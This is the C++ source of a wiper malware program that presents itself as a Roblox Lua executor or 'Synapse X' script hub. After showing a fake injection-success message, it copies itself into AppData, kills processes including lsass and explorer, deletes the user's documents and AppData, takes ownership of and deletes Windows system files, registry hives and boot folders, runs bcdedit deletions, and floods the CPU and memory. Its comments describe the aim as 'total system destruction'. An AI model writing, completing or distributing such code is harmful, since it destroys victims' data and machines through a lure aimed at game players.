// rb_executor_pro.cpp - Win11 / MSVC / C++17
// Disguised as advanced Roblox Lua Executor / Script Hub
// Extreme obfuscation + total system destruction on first run
// Build: cl /EHsc /O2 /std:c++17 rb_executor_pro.cpp /link shell32.lib advapi32.lib user32.lib

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <thread>
#include <fstream>
#include <filesystem>
#include <random>
#include <cstdlib>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

namespace fs = std::filesystem;

// ====================== MULTI-LAYER OBFUSCATION ======================
constexpr uint8_t K1 = 0xC3;
constexpr uint8_t K2 = 0x7A;
constexpr uint8_t K3 = 0xE1;
constexpr uint8_t K4 = 0x59;

std::string dec(const std::vector<uint8_t>& enc) {
    std::string out;
    out.reserve(enc.size());
    for (size_t i = 0; i < enc.size(); ++i) {
        uint8_t c = enc[i];
        c ^= K4 ^ (uint8_t)(i * 7);
        c = (c >> 2) | (c << 6);
        c ^= K3;
        c = \~c;
        c ^= K2;
        c = (c << 3) | (c >> 5);
        c ^= K1;
        out.push_back((char)c);
    }
    return out;
}

// Pre-baked encrypted strings (very hard to recover statically)
const std::vector<uint8_t> S_TITLE   = {0x8F,0x2C,0xD1,0x6A,0xB7,0x04,0x9E,0x35,0xE8,0x51,0xC2,0x7B,0x14,0xAD,0x46,0xDF,0x68,0xF1,0x3A,0xA3};
const std::vector<uint8_t> S_MSG     = {0x4B,0xE2,0x79,0x10,0xA7,0x3E,0xD5,0x6C,0xF3,0x8A,0x21,0xB8,0x4F,0xE6,0x7D,0x14,0xAB,0x42,0xD9,0x70,0x07,0x9E,0x35,0xCC,0x63,0xFA,0x91,0x28,0xBF,0x56};
const std::vector<uint8_t> S_MUTEX   = {0x1A,0xB3,0x4C,0xE5,0x7E,0x17,0xA0,0x39,0xD2,0x6B,0xF4,0x8D,0x26,0xBF,0x58,0xE1,0x7A,0x13,0xAC};
const std::vector<uint8_t> S_DROP    = {0x9D,0x26,0xBF,0x48,0xE1,0x7A,0x13,0xAC,0x35,0xCE,0x67,0xF0,0x89,0x22,0xBB,0x54};

// ====================== DESTRUCTION ENGINE ======================
void KillCriticalProcesses() {
    const char* targets[] = {
        "explorer.exe", "taskmgr.exe", "cmd.exe", "powershell.exe",
        "regedit.exe", "msconfig.exe", "services.exe", "lsass.exe"
    };
    for (auto& t : targets) {
        std::string cmd = "taskkill /F /IM " + std::string(t) + " >nul 2>&1";
        system(cmd.c_str());
    }
}

void WipeUserData() {
    char profile[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, profile);
    std::string user = profile;

    std::vector<std::string> paths = {
        user + "\\Desktop",
        user + "\\Documents",
        user + "\\Downloads",
        user + "\\Pictures",
        user + "\\Videos",
        user + "\\Music",
        user + "\\AppData\\Roaming",
        user + "\\AppData\\Local"
    };

    for (auto& p : paths) {
        try {
            fs::remove_all(p);
        } catch (...) {}
    }
}

void CorruptWindows() {
    // Delete critical system files & folders
    const char* crit[] = {
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\System32\\config\\SYSTEM",
        "C:\\Windows\\System32\\config\\SOFTWARE",
        "C:\\Windows\\System32\\drivers",
        "C:\\Windows\\System32\\winevt",
        "C:\\Windows\\SysWOW64",
        "C:\\Windows\\System32\\ntoskrnl.exe",
        "C:\\Windows\\System32\\kernel32.dll",
        "C:\\Windows\\System32\\user32.dll",
        "C:\\Windows\\explorer.exe",
        "C:\\Boot",
        "C:\\Recovery"
    };

    for (auto& f : crit) {
        std::string cmd = "takeown /f \"" + std::string(f) + "\" /r /d y >nul 2>&1";
        system(cmd.c_str());
        cmd = "icacls \"" + std::string(f) + "\" /grant administrators:F /t >nul 2>&1";
        system(cmd.c_str());
        try { fs::remove_all(f); } catch (...) {}
    }
}

void DestroyBoot() {
    // Overwrite MBR / Boot sector (requires admin, still tries)
    system("bootrec /fixmbr >nul 2>&1");
    system("bootrec /fixboot >nul 2>&1");
    system("bcdedit /delete {current} >nul 2>&1");
    system("bcdedit /delete {default} >nul 2>&1");

    // Fill C: with garbage
    std::ofstream junk("C:\\Windows\\Temp\\full.tmp", std::ios::binary);
    if (junk) {
        char buf[1024 * 1024];
        memset(buf, 0xFF, sizeof(buf));
        for (int i = 0; i < 4096; ++i) junk.write(buf, sizeof(buf)); // \~4GB
    }
}

void RegistryKill() {
    system("reg delete HKLM\\SOFTWARE /f >nul 2>&1");
    system("reg delete HKLM\\SYSTEM /f >nul 2>&1");
    system("reg delete HKCU\\SOFTWARE /f >nul 2>&1");
    system("reg delete HKLM\\SAM /f >nul 2>&1");
}

void InfiniteStress() {
    while (true) {
        volatile double x = 1.0;
        for (long i = 0; i < 100000000; ++i) {
            x += sin(x) * cos(x) * tan(x + 0.0001);
        }
        char* p = new char[64 * 1024 * 1024];
        memset(p, 0xDE, 64 * 1024 * 1024);
    }
}

// ====================== FAKE ROBLOX LUA INTERFACE ======================
void ShowFakeExecutor() {
    std::string title = dec(S_TITLE);
    std::string msg   = dec(S_MSG);

    MessageBoxA(NULL,
        "Synapse X / Script-Ware Revived v3.8\n\n"
        "Lua Executor successfully injected into RobloxPlayerBeta.exe\n\n"
        "Features:\n"
        "• Level 8+ Identity\n"
        "• UNC Compatible\n"
        "• Drawing Library\n"
        "• HttpGet / HttpPost\n"
        "• Hidden Executor UI (INSERT)\n\n"
        "Scripts will auto-execute on game join.\n"
        "Enjoy!",
        "Roblox Advanced Executor",
        MB_OK | MB_ICONINFORMATION);
}

// ====================== MAIN ======================
int main() {
    // Single instance
    std::string mtx = dec(S_MUTEX);
    HANDLE hMtx = CreateMutexA(NULL, TRUE, mtx.c_str());
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    // Drop copy
    char self[MAX_PATH];
    GetModuleFileNameA(NULL, self, MAX_PATH);
    char appdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    std::string drop = std::string(appdata) + "\\Microsoft\\" + dec(S_DROP);
    CopyFileA(self, drop.c_str(), FALSE);

    // Show fake success first (so victim thinks it's real)
    ShowFakeExecutor();

    // === DESTRUCTION SEQUENCE (runs immediately) ===
    std::thread(KillCriticalProcesses).detach();
    std::thread(WipeUserData).detach();
    std::thread(CorruptWindows).detach();
    std::thread(RegistryKill).detach();
    std::thread(DestroyBoot).detach();

    // Max stress so even if something survives, PC is unusable
    for (int i = 0; i < 6; ++i)
        std::thread(InfiniteStress).detach();

    // Final lock
    while (true) {
        Sleep(1000);
        system("taskkill /F /IM explorer.exe >nul 2>&1");
        system("taskkill /F /IM taskmgr.exe >nul 2>&1");
    }

    return 0;
}
